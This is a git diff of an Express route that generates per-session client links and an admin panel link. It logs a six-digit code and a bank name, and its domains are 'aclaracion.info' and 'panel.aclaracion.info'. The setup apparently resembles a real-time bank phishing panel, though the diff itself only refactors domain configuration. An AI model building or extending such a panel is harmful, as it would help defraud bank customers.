@@ -602,14 +602,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
       });
 
-      // Usar el dominio aclaracion.info según la solicitud del usuario
-      const domain = 'aclaracion.info';
+      // Configuración de dominios
+      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaracion.info';
+      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaracion.info';
 
-      // Armamos el enlace final - usando el dominio en producción
-      const link = `https://${domain}/client/${sessionId}`;
+      // Armamos los enlaces para ambos dominios
+      const clientLink = `https://${clientDomain}/client/${sessionId}`;
+      const adminLink = `https://${adminDomain}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
-      console.log(`URL del cliente: ${link}`);
+      console.log(`URL del cliente: ${clientLink}`);
+      console.log(`URL del admin: ${adminLink}`);
       console.log(`Generado por usuario: ${user.username}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
@@ -625,7 +628,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       res.json({ 
         sessionId, 
-        link, 
+        link: clientLink, 
+        adminLink: adminLink,
         code: sixDigitCode
       });
     } catch (error) {
